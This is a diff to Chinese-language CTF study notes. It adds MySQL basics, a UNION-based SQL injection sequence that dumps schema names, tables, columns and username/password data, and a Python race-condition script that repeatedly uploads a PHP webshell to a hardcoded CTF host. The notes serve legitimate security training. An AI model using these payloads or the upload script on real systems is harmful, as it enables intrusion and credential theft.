@@ -44,11 +44,39 @@ grep -r flag* 用来匹配flag文件
 默认口令：
 字典爆破：
 ### SQL注入：
-整数型注入：
-字符型注入：
-报错注入：
-布尔型注入：
-时间盲注：
+用户在查询时通过拼接一些恶意的sql语句来欺骗服务器达到不应该达到的地方
+基本操作：
+连接数据库：mysql -uroot -ppassword
+显示所有数据库：show databases；数据太多的话加/G分页显示
+使用数据库:use databasename；
+查看当前数据库名称:select database();
+查看数据库表名称:show tables;
+查询数据:select * from tablename;
+查看表结构:desc tablename;
+查看创建表语句:show create table users\G
+!!不加引号表示字段名，加引号表示值,数字除外
+information_schema数据库是mysql自带的信息数据库，用于存储数据库元数据(关于数据的数据)，例如数据库名，表名，列的数据类型，访问权限等。其中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。其中有两个重要的表  
+tables 表：  
+table_schema:数据库名字段  
+table_name:表名称字段  
+columns表：  
+column_name:列名称字段  
+table_schema:表名称字段  
+最后还有非常重要的schema_name字段保存当前数据库服务器里面所有库名的信息
+#### 整数型注入：
+?id=1输入后会有回显，证明是整型注入，输入变量没有用单引号
+注入步骤：  
+1:查询字段数： `?id=1 union order by 3`  
+2:判断回显位：`?id=-1 union select 1,2,3`  
+3:查询当前数据库名：`?id=-1 union select 1,2,database()`  
+4:查询所有数据库名:`?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata`  
+5：查询数据库下的表名：`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'`  
+6:查询表下的列名字段:`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' `  
+7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名`
+#### 字符型注入：
+#### 报错注入：
+#### 布尔型注入：
+#### 时间盲注：
 mysql结构：
 cookie注入：
 UA注入：
@@ -91,7 +119,55 @@ GIF89a
 图片马的制作！！  
 常见题目：使用getimagesize获取文件类型，使用php_exif判断文件类型可以直接使用图片马
 #### 条件竞争：
+出现了先保存文件在判断然后删除的bug。
+解题方法：通过不断上传一个木马文件，并不断访问，总能在其删除之前访问到它。一旦访问到，就会执行所在文件的php代码，生成另外一个木马文件通过蚁剑连接  
+代码示列：
+```python
+import requests
+import threading
+import os
 
+class RaceCondition(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+
+        self.url = 'http://61.147.171.105:53486/upload/b.php'
+        self.uploadUrl = 'http://61.147.171.105:53486/upload.php'
+
+    def _get(self):
+        print('try to call uploaded file...')
+
+        r = requests.get(self.url)
+        if r.status_code == 200:
+            print('[*] create file heihei.php success.')
+            os._exit(0)
+
+    def _upload(self):
+        print('upload file...')
+        file = {'file': open('D:\\CTF\\b.php', 'r')}
+        requests.post(self.uploadUrl, files=file)
+
+
+    def run(self):
+        while True:
+            for i in range(5):
+                self._get()
+
+            for i in range(10):
+                self._upload()
+                self._get()
+
+if __name__ == '__main__':
+    threads = 5
+
+    for i in range(threads):
+        t = RaceCondition()
+        t.start()
+
+    for i in range(threads):
+        t.join()
+
+```
 ### XSS：
 反射型：
 存储型：
